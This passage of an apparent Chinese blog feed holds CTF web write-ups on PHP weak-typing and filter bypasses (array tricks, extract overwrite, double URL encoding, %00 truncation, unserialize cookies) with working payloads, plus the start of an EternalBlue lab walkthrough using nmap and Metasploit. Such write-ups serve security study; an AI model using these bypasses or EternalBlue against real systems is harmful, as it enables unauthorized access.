<h2 id="strcmp绕过"><a href="#strcmp绕过" class="headerlink" title="strcmp绕过"></a>strcmp绕过</h2><p>strcmp（string $str1,string $str2）<br>如果 str1 小于 str2 ，返回 &lt; 0;<br>如果 str1 大于 str2 ，返回 &gt; 0;<br>如果两者相等，返回0；</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"><span class="built_in">echo</span> strcmp(<span class="string">"abc"</span>,<span class="string">"abc"</span>);//相等</span><br><span class="line"><span class="built_in">echo</span> strcmp(<span class="string">"abc"</span>,<span class="string">"abcde"</span>);//abc 小于 abcde</span><br><span class="line"><span class="built_in">echo</span> strcmp(<span class="string">"abcde"</span>,<span class="string">"abc"</span>);//abcde 大于 abc</span><br><span class="line"><span class="built_in">echo</span> strcmp(<span class="string">"abc"</span>,<span class="string">"abC"</span>);//abc 小于 abC</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<p>在php5.2之前，strcmp(数组,字符串);结果返回-1<br>在php5.3开始，strcmp(数组,字符串);结果返回0</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">highlight_file(<span class="string">'flag.php'</span>)</span><br><span class="line"><span class="variable">$flag</span>=<span class="string">'&#123;***************&#125;'</span></span><br><span class="line"><span class="keyword">if</span> (isset(<span class="variable">$_GET</span>[<span class="string">'password'</span>])</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span> (strcmp(<span class="variable">$_GET</span>[<span class="string">'password'</span>],<span class="variable">$flag</span>)==0)</span><br><span class="line">        die(<span class="string">'Flag:'</span>.<span class="variable">$flag</span>);</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        <span class="built_in">print</span> <span class="string">'Invalid pasword'</span>;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<p>$_GET[‘password’],$flag)==0,此处并不知道flag的值是多少，但是只要结果为0即可，所以可以构造一个数组password[]=123,这样就会返回一个0了</p>
<h2 id="json绕过"><a href="#json绕过" class="headerlink" title="json绕过"></a>json绕过</h2><p>先初步了解了一下<br>json:<a href="https://www.runoob.com/json/json-tutorial.html" target="_blank" rel="noopener">https://www.runoob.com/json/json-tutorial.html</a></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"><span class="keyword">if</span> (isset(<span class="variable">$_POST</span>[<span class="string">'message'</span>]))</span><br><span class="line">&#123;</span><br><span class="line">    <span class="variable">$message</span> = json_decode(<span class="variable">$_POST</span>[<span class="string">'message'</span>]);</span><br><span class="line">    <span class="variable">$key</span> = <span class="string">"*********"</span>;</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$message</span>-&gt;key == <span class="variable">$key</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">echo</span> <span class="string">"flag"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">echo</span> <span class="string">"fail"</span>;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">echo</span> <span class="string">"~~~~"</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<p>json_decode: 对JSON格式的字符串进行解码，接受一个JSON编码的字符串并且把它转换为PHP变量<br>json_decode(string $json[,bool $assoc = FALSE[,int $depth = 512[,int $options = 0]]])<br>其中第二个参数assoc设置为true时，将会返回一个数组array,否则返回一个对象object<br>此处并不知道key的值，key在比较时转换失败返回0，那么就可以构造一个键值对message{“key”:0}进行绕过</p>
]]></content>
      <categories>
        <category>CTF-Web</category>
      </categories>
  </entry>
  <entry>
    <title>Bugku-Web</title>
    <url>/2020/03/23/Bugku-Web/</url>
    <content><![CDATA[<h3 id="备份是个好习惯"><a href="#备份是个好习惯" class="headerlink" title="备份是个好习惯"></a>备份是个好习惯</h3><p>题目提到备份文件，即index.php.bak<br>访问一下，下载下来后</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">/**</span><br><span class="line"> * Created by PhpStorm.</span><br><span class="line"> * User: Norse</span><br><span class="line"> * Date: 2017/8/6</span><br><span class="line"> * Time: 20:22</span><br><span class="line">*/</span><br><span class="line">include_once <span class="string">"flag.php"</span>;</span><br><span class="line">ini_set(<span class="string">"display_errors"</span>, 0);</span><br><span class="line"><span class="variable">$str</span> = strstr(<span class="variable">$_SERVER</span>[<span class="string">'REQUEST_URI'</span>], <span class="string">'?'</span>);</span><br><span class="line"><span class="variable">$str</span> = substr(<span class="variable">$str</span>,1);</span><br><span class="line"><span class="variable">$str</span> = str_replace(<span class="string">'key'</span>,<span class="string">''</span>,<span class="variable">$str</span>);</span><br><span class="line">parse_str(<span class="variable">$str</span>);</span><br><span class="line"><span class="built_in">echo</span> md5(<span class="variable">$key1</span>);</span><br><span class="line"><span class="built_in">echo</span> md5(<span class="variable">$key2</span>);</span><br><span class="line"><span class="keyword">if</span>(md5(<span class="variable">$key1</span>) == md5(<span class="variable">$key2</span>) &amp;&amp; <span class="variable">$key1</span> !== <span class="variable">$key2</span>)&#123;</span><br><span class="line">    <span class="built_in">echo</span> <span class="variable">$flag</span>.<span class="string">"取得flag"</span>;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<a id="more"></a>
<p>$_SERVER[‘REQUEST_URI’]：取当前的URI,也就是除域名外后面的完整的地址路径;<br>假设当前URL=<a href="http://www.zxfireworks.xyz/example/index.php，则结果为example/index.php" target="_blank" rel="noopener">http://www.zxfireworks.xyz/example/index.php，则结果为example/index.php</a><br>strstr(string1,string2)函数：寻找string2在string1中出现的位置，并返回查找到字符串的位置之后的全部字符串。当没有查找到符合的字符串时，strstr函数会返回 FALSE(布尔值);<br>例如：strstr(“Helloworld!”,”wo”),结果为world!<br>substr(string,start,length)函数：返回字符串的一部分;<br>例如：substr(“Helloworld!”,5)，结果为world!;从 start 位置开始获取字符串,length是规定被返回字符串的长度。默认是直到字符串的结尾。<br>parse_str(string $encoded_string,array $result)函数： encoded_string 是 URL 传递入的查询字符串；如果设置了第二个变量 result， 变量将会以数组元素的形式存入到这个数组，作为替代</p>
<p>因此，需要以get方式传入两个参数：key1和key2;<br>因为key会被过滤，双写绕过;<br>通过php中 == 比较漏洞或者数组绕过正则表达式<br>构造payload:?key1[]=1&amp;key2=2  or  ?kekeyy1[]=abc&amp;kekeyy2[]=123</p>
<h3 id="变量1"><a href="#变量1" class="headerlink" title="变量1"></a>变量1</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">flag In the variable ! </span><br><span class="line">&lt;?php  </span><br><span class="line">error_reporting(0);</span><br><span class="line">include <span class="string">"flag1.php"</span>;</span><br><span class="line">highlight_file(__file__);</span><br><span class="line"><span class="keyword">if</span>(isset(<span class="variable">$_GET</span>[<span class="string">'args'</span>]))&#123;</span><br><span class="line">    <span class="variable">$args</span> = <span class="variable">$_GET</span>[<span class="string">'args'</span>];</span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">"/^\w+$/"</span>,<span class="variable">$args</span>))&#123;</span><br><span class="line">        die(<span class="string">"args error!"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">eval</span>(<span class="string">"var_dump($<span class="variable">$args</span>);"</span>);</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<p>preg_match()函数中：/^开始, \w表示任意一个单词字符，即[0-9a-zA-Z_] ,+将前面的字符匹配一次或多次，$/结尾<br>var_dump()函数：输出变量的类型与值<br>在eval(“var_dump($$args);”)中$$srgs有两个$<br>$$:可变变量;</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"><span class="variable">$a</span> = <span class="string">'hello'</span>;</span><br><span class="line">$<span class="variable">$a</span> = <span class="string">'world'</span>;  //在$<span class="variable">$a</span>变量中，后面的<span class="variable">$a</span>是一个变量，即<span class="variable">$a</span>=<span class="string">'hello'</span>,那么$<span class="variable">$a</span>意思就是<span class="variable">$hello</span>,这是一个新变量，即$<span class="variable">$a</span> 等价于 <span class="variable">$hello</span>,把内变量的值作为外部变量的变量名</span><br><span class="line"><span class="built_in">echo</span> <span class="string">"<span class="variable">$a</span> <span class="variable">$&#123;$a&#125;</span>"</span>;    //hello <span class="variable">$hello</span> 即 hello world</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<p>因为字母字符被过滤，考虑超全局变量$GLOBALS<br>此处可通过var_dump()函数将$GLOBALS数组中存放的所有变量以数组的方式输出<br>构造payload:?args=GLOBALS</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">array(7) &#123; [<span class="string">"GLOBALS"</span>]=&gt; *RECURSION* [<span class="string">"_POST"</span>]=&gt; array(0) &#123; &#125; [<span class="string">"_GET"</span>]=&gt; array(1) &#123; [<span class="string">"args"</span>]=&gt; string(7) <span class="string">"GLOBALS"</span> &#125; [<span class="string">"_COOKIE"</span>]=&gt; array(0) &#123; &#125; [<span class="string">"_FILES"</span>]=&gt; array(0) &#123; &#125; [<span class="string">"ZFkwe3"</span>]=&gt; string(38) <span class="string">"flag&#123;92853051ab894a64f7865cf3c2128b34&#125;"</span> [<span class="string">"args"</span>]=&gt; string(7) <span class="string">"GLOBALS"</span> &#125;</span><br></pre></td></tr></table></figure>
<h3 id="域名解析"><a href="#域名解析" class="headerlink" title="域名解析"></a>域名解析</h3><p>要求把 flag.baidu.com 解析到123.206.87.240<br>修改HOST(负责域名快速解析的文件)<br>添加123.206.87.240        flag.baidu.com</p>
<h3 id="extract变量覆盖"><a href="#extract变量覆盖" class="headerlink" title="extract变量覆盖"></a>extract变量覆盖</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">    <span class="variable">$flag</span>=<span class="string">'xxx'</span>;</span><br><span class="line">    extract(<span class="variable">$_GET</span>);</span><br><span class="line">    <span class="keyword">if</span>(isset(<span class="variable">$shiyan</span>))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="variable">$content</span>=trim(file_get_contents(<span class="variable">$flag</span>));</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$shiyan</span>==<span class="variable">$content</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">echo</span><span class="string">'flag&#123;xxx&#125;'</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">echo</span><span class="string">'Oh.no'</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<p>extract(array,extract_rules,prefix)<br>从数组中将变量导入到当前的符号表。该函数使用数组键名作为变量名，使用数组键值作为变量值。针对数组中的每个元素，将在当前符号表中创建对应的一个变量。<br>其中第二个参数extract_rules是可选参数，将检查每个键名是否为合法的变量名，同时也检查和符号表中已存在的变量名是否冲突。对不合法和冲突的键名的处理将根据此参数决定。<br>EXTR_OVERWRITE - 默认。如果有冲突，则覆盖已有的变量。<br>这里就是利用extract()函数变量覆盖这一漏洞<br>构造payload：?shiyan=&amp;flag= or ?shiyan=<br>这样就会将原来的flag=content=’xxx’覆盖为flag=content=NULL</p>
<h3 id="urldecode二次编码绕过"><a href="#urldecode二次编码绕过" class="headerlink" title="urldecode二次编码绕过"></a>urldecode二次编码绕过</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">    <span class="keyword">if</span>(eregi(<span class="string">"hackerDJ"</span>,<span class="variable">$_GET</span>[id])) </span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">echo</span>(<span class="string">"not allowed!"</span>);</span><br><span class="line">        <span class="built_in">exit</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$_GET</span>[id] = urldecode(<span class="variable">$_GET</span>[id]);</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$_GET</span>[id] == <span class="string">"hackerDJ"</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">echo</span> <span class="string">"Access granted!"</span>;</span><br><span class="line">        <span class="built_in">echo</span> <span class="string">"flag"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<p>eregi():在一个字符串搜索指定的模式的字符串,搜索不区分大小写<br>第一个if语句判断id中是否包含”hackerDJ”<br>将接收到的id进行url解码，解码后要与”hackerDJ”相等<br>注意一点，将id传入时，浏览器会对id进行一次自动解码，所以要对”hackerDJ”进行两次url编码<br>payload:?id=%25%36%38%25%36%31%25%36%33%25%36%42%25%36%35%25%37%32%25%34%34%25%34%41</p>
<h3 id="md5-函数"><a href="#md5-函数" class="headerlink" title="md5()函数"></a>md5()函数</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">    error_reporting(0);</span><br><span class="line">    <span class="variable">$flag</span> = <span class="string">'flag&#123;test&#125;'</span>;</span><br><span class="line">    <span class="keyword">if</span> (isset(<span class="variable">$_GET</span>[<span class="string">'username'</span>]) and isset(<span class="variable">$_GET</span>[<span class="string">'password'</span>])) </span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$_GET</span>[<span class="string">'username'</span>] == <span class="variable">$_GET</span>[<span class="string">'password'</span>])</span><br><span class="line">            <span class="built_in">print</span> <span class="string">'Your password can not be your username.'</span>;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> (md5(<span class="variable">$_GET</span>[<span class="string">'username'</span>]) === md5(<span class="variable">$_GET</span>[<span class="string">'password'</span>]))</span><br><span class="line">            die(<span class="string">'Flag: '</span>.<span class="variable">$flag</span>);</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            <span class="built_in">print</span> <span class="string">'Invalid password'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<p>要想拿到flag,传入的username和password在值上不能相等，但是在md5()处理后要相等。<br>PHP在处理哈希字符串时，会利用”!=”或”==”来对哈希值进行比较，它把每一个以”0E”开头的哈希值都解释为0，所以如果两个不同的密码经过哈希以后，其哈希值都是以”0E”开头的，那么PHP将会认为他们相同，都是0。<br>| QNKCDZO | 240610708 | s878926199a | s155964671a | s214587387a |<br>测试后发现不行，才发现这里的md5判断用的”===”,无法利用0e<br>在PHP中，MD5是不能处理数组的，md5(数组)会返回null<br>于是构造payload:?username[]=abc&amp;password[]=123</p>
<h3 id="弱类型整数大小比较绕过"><a href="#弱类型整数大小比较绕过" class="headerlink" title="弱类型整数大小比较绕过"></a>弱类型整数大小比较绕过</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="variable">$temp</span> = <span class="variable">$_GET</span>[<span class="string">'password'</span>];</span><br><span class="line">is_numeric(<span class="variable">$temp</span>)?die(<span class="string">"no numeric"</span>):NULL;</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$temp</span>&gt;1336)&#123;</span><br><span class="line"><span class="built_in">echo</span> <span class="variable">$flag</span>;</span><br></pre></td></tr></table></figure>
<p>password既要不是数字，还要大于1336，两种方法绕过<br>0、利用数组绕过，即?password[]=123<br>1、选个大于1336的数字，在后面加个字符使其成为字符串，?password=1337a</p>
<h3 id="sha-函数比较绕过"><a href="#sha-函数比较绕过" class="headerlink" title="sha()函数比较绕过"></a>sha()函数比较绕过</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">    <span class="variable">$flag</span> = <span class="string">"flag"</span>;</span><br><span class="line">    <span class="keyword">if</span> (isset(<span class="variable">$_GET</span>[<span class="string">'name'</span>]) and isset(<span class="variable">$_GET</span>[<span class="string">'password'</span>]))</span><br><span class="line">    &#123;</span><br><span class="line">        var_dump(<span class="variable">$_GET</span>[<span class="string">'name'</span>]);</span><br><span class="line">        <span class="built_in">echo</span> <span class="string">""</span>;</span><br><span class="line">        var_dump(<span class="variable">$_GET</span>[<span class="string">'password'</span>]);</span><br><span class="line">        var_dump(sha1(<span class="variable">$_GET</span>[<span class="string">'name'</span>]));</span><br><span class="line">        var_dump(sha1(<span class="variable">$_GET</span>[<span class="string">'password'</span>]));</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$_GET</span>[<span class="string">'name'</span>] == <span class="variable">$_GET</span>[<span class="string">'password'</span>])</span><br><span class="line">            <span class="built_in">echo</span> <span class="string">'Your password can not be your name!'</span>;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> (sha1(<span class="variable">$_GET</span>[<span class="string">'name'</span>]) === sha1(<span class="variable">$_GET</span>[<span class="string">'password'</span>]))</span><br><span class="line">            die(<span class="string">'Flag: '</span>.<span class="variable">$flag</span>);</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            <span class="built_in">echo</span> <span class="string">'Invalid password.'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        <span class="built_in">echo</span> <span class="string">'Login first!'</span>;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<p>直接数组绕过<br>payload:?name[]=a&amp;password[]=b</p>
<h3 id="十六进制与数字比较"><a href="#十六进制与数字比较" class="headerlink" title="十六进制与数字比较"></a>十六进制与数字比较</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">    error_reporting(0);</span><br><span class="line">    <span class="keyword">function</span> noother_says_correct(<span class="variable">$temp</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="variable">$flag</span> = <span class="string">'flag&#123;test&#125;'</span>;</span><br><span class="line">        <span class="variable">$one</span> = ord(<span class="string">'1'</span>); //ord — 返回字符的 ASCII 码值 49</span><br><span class="line">        <span class="variable">$nine</span> = ord(<span class="string">'9'</span>); //ord — 返回字符的 ASCII 码值 57</span><br><span class="line">        <span class="variable">$number</span> = <span class="string">'3735929054'</span>; </span><br><span class="line">        // Check all the input characters!</span><br><span class="line">        <span class="keyword">for</span> (<span class="variable">$i</span> = 0; <span class="variable">$i</span> &lt; strlen(<span class="variable">$number</span>); <span class="variable">$i</span>++) //0-9</span><br><span class="line">        &#123;</span><br><span class="line">            // Disallow all the digits!</span><br><span class="line">            <span class="variable">$digit</span> = ord(<span class="variable">$temp</span>&#123;<span class="variable">$i</span>&#125;);</span><br><span class="line">            <span class="keyword">if</span> ( (<span class="variable">$digit</span> &gt;= <span class="variable">$one</span>) &amp;&amp; (<span class="variable">$digit</span> &lt;= <span class="variable">$nine</span>) )</span><br><span class="line">            &#123;</span><br><span class="line">                // Aha, digit not allowed!</span><br><span class="line">                <span class="built_in">return</span> <span class="string">"flase"</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$number</span> == <span class="variable">$temp</span>)</span><br><span class="line">        <span class="built_in">return</span> <span class="variable">$flag</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$temp</span> = <span class="variable">$_GET</span>[<span class="string">'password'</span>];</span><br><span class="line">    <span class="built_in">echo</span> noother_says_correct(<span class="variable">$temp</span>);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<p>传入password，要使其与3735929054相等，同时每一位都不能在1-9之间<br>其中ord()函数如果参数为null,则会返回0，此处如果传入的为16进制编码后的password,php转码时会自动将16进制转为10进制。<br>其中$temp($i)对16进制进行操作时，会被处理成null<br>因此可将”3735929054”进行16进制编码后再传入<br>构造payload:?password=0xdeadc0de</p>
<h3 id="ereg正则-00截断"><a href="#ereg正则-00截断" class="headerlink" title="ereg正则%00截断"></a>ereg正则%00截断</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">    <span class="variable">$flag</span> = <span class="string">"xxx"</span>;</span><br><span class="line">    <span class="keyword">if</span> (isset (<span class="variable">$_GET</span>[<span class="string">'password'</span>]))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (ereg (<span class="string">"^[a-zA-Z0-9]+$"</span>, <span class="variable">$_GET</span>[<span class="string">'password'</span>]) === FALSE)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">echo</span> <span class="string">'You password must be alphanumeric'</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> (strlen(<span class="variable">$_GET</span>[<span class="string">'password'</span>]) &lt; 8 &amp;&amp; <span class="variable">$_GET</span>[<span class="string">'password'</span>] &gt; 9999999)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span> (strpos (<span class="variable">$_GET</span>[<span class="string">'password'</span>], <span class="string">'-'</span>) !== FALSE) //strpos — 查找字符串首次出现的位置</span><br><span class="line">            &#123;</span><br><span class="line">                die(<span class="string">'Flag: '</span> . <span class="variable">$flag</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">            &#123;</span><br><span class="line">                <span class="built_in">echo</span>(<span class="string">'- have not been found'</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">echo</span> <span class="string">'Invalid password'</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<p>method1:利用数组绕过正则<br>ereg()和strpos()都无法处理数组，会返回null<br>payload:?password[]=a<br>method2:ereg()%00截断漏洞<br>ereg函数存在NULL截断漏洞，导致了正则过滤被绕过,所以可以使用%00截断正则匹配<br>并且位数小于8的同时还要大于9999999，这里可以利用科学计数法绕过，即1e7=10000000大于9999999<br>而且还要在password中匹配到”<em>-</em>“,这里可能是题目代码给错了，代码中给的”-“,发现提示说没匹配到”<em>-</em>“,应该是放题目的时候手误了<br>payload:?password=1e8%00<em>-</em></p>
<h3 id="数字验证正则绕过"><a href="#数字验证正则绕过" class="headerlink" title="数字验证正则绕过"></a>数字验证正则绕过</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">    error_reporting(0);</span><br><span class="line">    <span class="variable">$flag</span> = <span class="string">'flag&#123;test&#125;'</span>;</span><br><span class="line">    <span class="keyword">if</span> (<span class="string">"POST"</span> == <span class="variable">$_SERVER</span>[<span class="string">'REQUEST_METHOD'</span>])</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="variable">$password</span> = <span class="variable">$_POST</span>[<span class="string">'password'</span>];</span><br><span class="line">        //preg_match — 执行一个正则表达式匹配</span><br><span class="line">        <span class="keyword">if</span> (0 &gt;= preg_match(<span class="string">'/^[[:graph:]]&#123;12,&#125;$/'</span>, <span class="variable">$password</span>)) </span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">echo</span> <span class="string">'flag'</span>;</span><br><span class="line">            <span class="built_in">exit</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">while</span> (TRUE)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="variable">$reg</span> = <span class="string">'/([[:punct:]]+|[[:digit:]]+|[[:upper:]]+|[[:lower:]]+)/'</span>;</span><br><span class="line">            <span class="keyword">if</span> (6 &gt; preg_match_all(<span class="variable">$reg</span>, <span class="variable">$password</span>, <span class="variable">$arr</span>))</span><br><span class="line">                <span class="built_in">break</span>;</span><br><span class="line">            <span class="variable">$c</span> = 0;</span><br><span class="line">            <span class="variable">$ps</span> = array(<span class="string">'punct'</span>, <span class="string">'digit'</span>, <span class="string">'upper'</span>, <span class="string">'lower'</span>); //[[:punct:]] 任何标点符号 [[:digit:]] 任何数字 [[:upper:]] 任何大写字母 [[:lower:]] 任何小写字母</span><br><span class="line">            foreach (<span class="variable">$ps</span> as <span class="variable">$pt</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">if</span> (preg_match(<span class="string">"/[[:<span class="variable">$pt</span>:]]+/"</span>, <span class="variable">$password</span>))</span><br><span class="line">                    <span class="variable">$c</span> += 1;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> (<span class="variable">$c</span> &lt; 3) <span class="built_in">break</span>; //&gt;=3，必须包含四种类型三种与三种以上</span><br><span class="line">            <span class="keyword">if</span> (<span class="string">"42"</span> == <span class="variable">$password</span>) </span><br><span class="line">                <span class="built_in">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">            <span class="keyword">else</span> </span><br><span class="line">                <span class="built_in">echo</span> <span class="string">'Wrong password'</span>;</span><br><span class="line">            <span class="built_in">exit</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<p>method1:数组绕过<br>payload:password[]=1<br>method2:科学计数法绕过<br>payload:password=42.000000000000e-0</p>
<h3 id="flag-php-Hint-hint"><a href="#flag-php-Hint-hint" class="headerlink" title="flag.php(Hint:hint)"></a>flag.php(Hint:hint)</h3><p>第一个页面有个登陆框，输入后点击登陆没反应，题目提示是hint,尝试传入hint,页面出现php代码，看来是代码审计</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">error_reporting(0);</span><br><span class="line">include_once(<span class="string">"flag.php"</span>);</span><br><span class="line"><span class="variable">$cookie</span> = <span class="variable">$_COOKIE</span>[<span class="string">'ISecer'</span>];</span><br><span class="line"><span class="keyword">if</span>(isset(<span class="variable">$_GET</span>[<span class="string">'hint'</span>]))&#123;</span><br><span class="line">    show_source(__FILE__);</span><br><span class="line">&#125;</span><br><span class="line">elseif (unserialize(<span class="variable">$cookie</span>) === <span class="string">"<span class="variable">$KEY</span>"</span>)</span><br><span class="line">&#123;   </span><br><span class="line">    <span class="built_in">echo</span> <span class="string">"<span class="variable">$flag</span>"</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line">?&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;meta http-equiv=<span class="string">"Content-Type"</span> content=<span class="string">"text/html; charset=UTF-8"</span>&gt;</span><br><span class="line">&lt;title&gt;Login&lt;/title&gt;</span><br><span class="line">&lt;link rel=<span class="string">"stylesheet"</span> href=<span class="string">"admin.css"</span> <span class="built_in">type</span>=<span class="string">"text/css"</span>&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;br&gt;</span><br><span class="line">&lt;div class=<span class="string">"container"</span> align=<span class="string">"center"</span>&gt;</span><br><span class="line">  &lt;form method=<span class="string">"POST"</span> action=<span class="string">"#"</span>&gt;</span><br><span class="line">    &lt;p&gt;&lt;input name=<span class="string">"user"</span> <span class="built_in">type</span>=<span class="string">"text"</span> placeholder=<span class="string">"Username"</span>&gt;&lt;/p&gt;</span><br><span class="line">    &lt;p&gt;&lt;input name=<span class="string">"password"</span> <span class="built_in">type</span>=<span class="string">"password"</span> placeholder=<span class="string">"Password"</span>&gt;&lt;/p&gt;</span><br><span class="line">    &lt;p&gt;&lt;input value=<span class="string">"Login"</span> <span class="built_in">type</span>=<span class="string">"button"</span>/&gt;&lt;/p&gt;</span><br><span class="line">  &lt;/form&gt;</span><br><span class="line">&lt;/div&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br><span class="line">&lt;?php</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$KEY</span>=<span class="string">'ISecer:www.isecer.com'</span>;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<p>看到unserialize就知道是反序列化问题了<br>根据代码意思，是让cookie参数ISecer的值反序列化后等于$KEY的值<br>代码最下面就给出了$KEY的值，测试过后并没成功<br>继续分析源码，发现$KEY在反序列化比较前并没有被赋值，下面的赋值对上面的if判断没有作用，所以此时的$KEY的值应该为null(空)，而serialize(“”)=s:0:””;<br><img src="https://gitee.com/zxfireworks/BlogPic/raw/master/Bugku-Web/flagphp.PNG" alt=""><br>返回第一个页面刷新即可拿到flag</p>
]]></content>
      <categories>
        <category>CTF-Web</category>
      </categories>
  </entry>
  <entry>
    <title>EternalBlue</title>
    <url>/2020/06/09/EternalBlue/</url>
    <content><![CDATA[<p>攻击机：Kali<br>靶机：Win7<br>在测试前需要拿到靶机的公网ip地址<br>这里的靶机ip地址为192.168.1.106<br>靶机需要打开位于 控制面板-&gt;网络和Internet-&gt;网络和共享中心-&gt;高级共享设置 中的启用网络发现和启用文件和打印机共享</p>
<a id="more"></a>
<h3 id="测试靶机是否有永恒之蓝漏洞"><a href="#测试靶机是否有永恒之蓝漏洞" class="headerlink" title="测试靶机是否有永恒之蓝漏洞"></a>测试靶机是否有永恒之蓝漏洞</h3><p>靶机需要满足开启445端口，使用Nmap端口扫描</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nmap 192.168.1.106</span><br></pre></td></tr></table></figure>
<p><img src="https://gitee.com/zxfireworks/BlogPic/raw/master/EternalBlue/ms17_010_0.jpg" alt=""><br>靶机开启了139和445端口，就可以进行测试了</p>
<h3 id="使用Metasploit利用永恒之蓝漏洞对靶机进行渗透"><a href="#使用Metasploit利用永恒之蓝漏洞对靶机进行渗透" class="headerlink" title="使用Metasploit利用永恒之蓝漏洞对靶机进行渗透"></a>使用Metasploit利用永恒之蓝漏洞对靶机进行渗透</h3><p>在Kali中打开Metasploit</p>
